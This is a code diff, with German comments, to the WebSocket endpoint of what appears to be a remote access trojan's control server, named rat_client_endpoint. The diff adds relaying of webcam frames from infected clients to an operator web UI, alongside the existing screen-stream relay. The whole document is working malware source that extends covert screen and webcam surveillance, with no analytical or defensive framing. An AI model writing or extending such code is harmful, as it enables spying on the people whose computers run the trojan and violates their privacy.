@@ -252,6 +252,7 @@ async def rat_client_endpoint(websocket: WebSocket):
 
     try:
         screen_meta = None
+        webcam_meta = None
         while True:
             try:
                 data = await asyncio.wait_for(websocket.receive(), timeout=180)
@@ -261,7 +262,7 @@ async def rat_client_endpoint(websocket: WebSocket):
                 break
             if data["type"] == "websocket.receive":
                 if "bytes" in data and data["bytes"]:
-                    # Binärdaten: Screenstream-Frame
+                    # Binärdaten: Screenstream-Frame (nicht für Webcam, da base64)
                     if screen_meta:
                         await send_to_web_ui({
                             "action": "screen_frame",
@@ -276,6 +277,20 @@ async def rat_client_endpoint(websocket: WebSocket):
                 elif "text" in data and data["text"]:
                     try:
                         meta = json.loads(data["text"])
+                        # Webcam-Stream: Meta-Frame
+                        if meta.get("action") == "webcam_frame":
+                            # Sende Meta-Frame an Web-UI, dann erwarte base64-Frame als Text
+                            await send_to_web_ui(meta)
+                            # Nächstes Frame (base64) empfangen
+                            img_data = await asyncio.wait_for(websocket.receive(), timeout=5)
+                            if img_data["type"] == "websocket.receive" and "text" in img_data and img_data["text"]:
+                                await send_to_web_ui({
+                                    "action": "webcam_frame",
+                                    "client_id": str(client_id),
+                                    "img_base64": img_data["text"]
+                                })
+                            continue
+                        # Screenstream-Frame: Meta
                         if meta.get("action") == "screen_frame":
                             screen_meta = meta
                             continue
